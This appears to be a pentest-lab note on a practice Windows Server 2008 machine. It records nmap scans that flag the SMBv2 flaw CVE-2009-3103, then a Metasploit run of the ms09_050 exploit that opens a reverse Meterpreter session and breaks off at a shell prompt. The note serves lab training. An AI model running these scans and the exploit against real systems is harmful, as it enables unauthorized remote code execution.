---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/unsolved
  - tech/web/xss
  - tech/payload/metasploit
type: machine
platform: pg
os: windows
ip: 192.168.62.40
ports: [53, 135, 139, 445, 3389, 5357]
services: [domain, http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
cves: [CVE-2009-3103, CVE-2012-1182]
status: unsolved
tech_count: 2
---
```bash
???(kali?kali)-[~]
??$ sudo nmap -sV -sC -p- -O 192.168.62.40   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 04:19 +0000
Stats: 0:11:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 04:31 (0:00:30 remaining)
Stats: 0:11:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 04:32 (0:00:36 remaining)
Nmap scan report for 192.168.62.40
Host is up (0.00035s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-03-04T23:44:47
|_Not valid after:  2025-09-03T23:44:47
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-06-30T04:31:53+00:00
|_ssl-date: 2026-06-30T04:32:01+00:00; -1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
OS details: Microsoft Windows 7 or Windows Server 2008 R2, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 2 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:7e:de (VMware)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-29T21:31:53-07:00
| smb2-time: 
|   date: 2026-06-30T04:31:53
|_  start_date: 2025-03-05T23:44:46
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 730.79 seconds


???(kali?kali)-[~]
??$ sudo nmap -sVC -vvv 192.168.62.40 --script vuln
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 04:44 +0000
NSE: Loaded 152 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 04:44
Completed NSE at 04:44, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 04:44
Completed NSE at 04:44, 0.00s elapsed
Initiating Ping Scan at 04:44
Scanning 192.168.62.40 [4 ports]
Completed Ping Scan at 04:44, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:44
Completed Parallel DNS resolution of 1 host. at 04:44, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:44
Scanning 192.168.62.40 [1000 ports]
Discovered open port 445/tcp on 192.168.62.40
Discovered open port 53/tcp on 192.168.62.40
Discovered open port 139/tcp on 192.168.62.40
Discovered open port 3389/tcp on 192.168.62.40
Discovered open port 135/tcp on 192.168.62.40
Increasing send delay for 192.168.62.40 from 0 to 5 due to 24 out of 79 dropped probes since last increase.
Increasing send delay for 192.168.62.40 from 5 to 10 due to 12 out of 38 dropped probes since last increase.
Discovered open port 49153/tcp on 192.168.62.40
Discovered open port 49158/tcp on 192.168.62.40
Discovered open port 49155/tcp on 192.168.62.40
Discovered open port 49156/tcp on 192.168.62.40
Discovered open port 49152/tcp on 192.168.62.40
Discovered open port 5357/tcp on 192.168.62.40
Discovered open port 49154/tcp on 192.168.62.40
Discovered open port 49157/tcp on 192.168.62.40
Completed SYN Stealth Scan at 04:44, 11.19s elapsed (1000 total ports)
Initiating Service scan at 04:44
Scanning 13 services on 192.168.62.40
Service scan Timing: About 53.85% done; ETC: 04:46 (0:00:45 remaining)
Completed Service scan at 04:45, 58.56s elapsed (13 services on 1 host)
NSE: Script scanning 192.168.62.40.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 04:45
NSE Timing: About 97.95% done; ETC: 04:46 (0:00:01 remaining)
NSE Timing: About 98.98% done; ETC: 04:46 (0:00:01 remaining)
NSE Timing: About 99.94% done; ETC: 04:47 (0:00:00 remaining)
Completed NSE at 04:47, 102.78s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 04:47
NSE: [ssl-ccs-injection 192.168.62.40:3389] No response from server: ERROR
Completed NSE at 04:47, 0.33s elapsed
Nmap scan report for 192.168.62.40
Host is up, received timestamp-reply ttl 127 (0.00030s latency).
Scanned at 2026-06-30 04:44:46 UTC for 173s
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 127 Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Service
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn''t find any CSRF vulnerabilities.
|_http-jsonp-detection: Couldn''t find any JSONP endpoints.
|_http-stored-xss: Couldn''t find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn''t find any DOM based XSS.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn''t find wp-login.php
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.62 seconds
           Raw packets sent: 1071 (47.100KB) | Rcvd: 1001 (40.092KB)



sudo msfconsole
search ms09-050
use 0
show options
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.49.62
LHOST => 192.168.49.62
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.62.40
RHOSTS => 192.168.62.40
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.49.62:4444 
[*] 192.168.62.40:445 - Connecting to the target (192.168.62.40:445)...
[*] 192.168.62.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.62.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (190534 bytes) to 192.168.62.40
[*] Meterpreter session 1 opened (192.168.49.62:4444 -> 192.168.62.40:49159) at 2026-06-30 05:16:53 +0000

meterpreter > shell


```